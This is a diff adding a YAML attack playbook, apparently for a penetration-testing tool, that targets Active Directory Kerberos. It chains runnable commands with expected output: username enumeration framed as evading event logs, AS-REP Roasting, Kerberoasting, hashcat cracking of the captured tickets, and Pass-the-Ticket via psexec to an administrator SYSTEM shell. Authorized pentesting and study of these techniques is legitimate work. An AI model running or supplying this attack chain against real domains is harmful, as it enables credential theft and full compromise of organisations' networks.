@@ -1,0 +1,74 @@
+id: kerberos
+name: Kerberos Attacks (Port 88)
+category: network
+description: Comprehensive Active Directory Kerberos attack methodology on port 88. Covers user enumeration (Kerbrute), AS-REP Roasting, Kerberoasting SPN accounts, and Pass-the-Ticket.
+port_triggers:
+  - 88
+service_triggers:
+  - kerberos
+  - kpasswd
+tags:
+  - kerberos
+  - active-directory
+  - kerberoasting
+  - asreproast
+steps:
+  - id: kerb-userenum
+    title: Kerberos Fast User Enumeration (Kerbrute)
+    phase: enumeration
+    purpose: Systematically validate domain usernames against Kerberos without generating login failure events in event logs.
+    command: kerbrute userenum --dc {{TARGET}} -d {{DOMAIN|corp.local}} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt
+    expected_output:
+      - '[+] VALID USERNAME:   administrator@corp.local'
+      - '[+] VALID USERNAME:   svc_backup@corp.local'
+      - '[+] VALID USERNAME:   jdoe@corp.local'
+    common_mistakes:
+      - Not syncing your machine time with the Domain Controller (`sudo ntpdate {{TARGET}}`); Kerberos fails if clock skew > 5 mins.
+    if_success: Valid users discovered! Save list to `users.txt` and proceed to AS-REP Roasting.
+    if_failure: Clock skew error or domain unreachable. Ensure `/etc/hosts` has `{{TARGET}} {{DOMAIN}}`.
+    references:
+      - https://wadcoms.github.io/
+      - https://book.hacktricks.xyz/windows-hardening/active-directory-methodology
+  - id: kerb-asreproast
+    title: AS-REP Roasting (No Pre-Authentication Required)
+    phase: exploitation
+    purpose: Request TGT tickets for accounts with DONT_REQ_PREAUTH set; tickets contain crackable encrypted hashes that require ZERO credentials.
+    command: impacket-GetNPUsers '{{DOMAIN|corp.local}}/' -usersfile users.txt -format hashcat -outputfile asrep.hashes -dc-ip {{TARGET}}
+    expected_output:
+      - $krb5asrep$23$svc_backup@corp.local:283a218...
+    common_mistakes:
+      - Forgetting to run this check before having credentials; AS-REP Roasting works completely unauthenticated.
+    if_success: 'AS-REP hash extracted! Crack with Hashcat mode 18200: `hashcat -m 18200 asrep.hashes rockyou.txt`.'
+    if_failure: No accounts with Pre-Auth disabled. Proceed to Kerberoasting once valid user credentials are obtained.
+    references:
+      - https://wadcoms.github.io/
+  - id: kerb-roast-spn
+    title: Kerberoasting (Extract Service Account TGS Hashes)
+    phase: exploitation
+    purpose: Query Service Principal Names (SPNs) registered in Active Directory and extract crackable TGS ticket hashes for service accounts (e.g. MSSQL, IIS, Backup).
+    command: impacket-GetUserSPNs '{{DOMAIN|corp.local}}/{{USERNAME}}:{{PASSWORD}}' -dc-ip {{TARGET}} -request -outputfile kerberoast.hashes
+    expected_output:
+      - ServicePrincipalName    Name        MemberOf
+      - MSSQLSvc/sql.corp.local:1433  svc_sql     CN=Domain Admins...
+      - $krb5tgs$23$*svc_sql*corp.local*...
+    common_mistakes:
+      - Not testing with domain-joined guest account if no user credentials are known.
+    if_success: 'TGS hash captured! Crack with Hashcat mode 13100: `hashcat -m 13100 kerberoast.hashes rockyou.txt -r best64.rule`.'
+    if_failure: No SPNs found or account credentials invalid. Check LDAP descriptions or SMB shares.
+    references:
+      - https://wadcoms.github.io/
+  - id: kerb-pass-the-ticket
+    title: Pass-the-Ticket (TGT / TGS Injection)
+    phase: exploitation
+    purpose: Inject a captured `.ccache` or `.kirbi` Kerberos ticket into your current terminal session to execute remote commands without knowing the plaintext password.
+    command: export KRB5CCNAME=administrator.ccache && impacket-psexec -k -no-pass {{DOMAIN|corp.local}}/administrator@{{TARGET}}
+    expected_output:
+      - '[*] Requesting shares on {{TARGET}}...'
+      - '[*] Found writable share ADMIN$'
+      - '[*] Opening interactive shell...'
+    common_mistakes:
+      - Using IP instead of Hostname/FQDN; Kerberos ticket verification strictly requires hostname matching.
+    if_success: Administrator SYSTEM shell spawned via Kerberos ticket delegation!
+    if_failure: Ticket expired or clock skew. Check ticket lifetime with `klist`.
+    references:
+      - https://wadcoms.github.io/
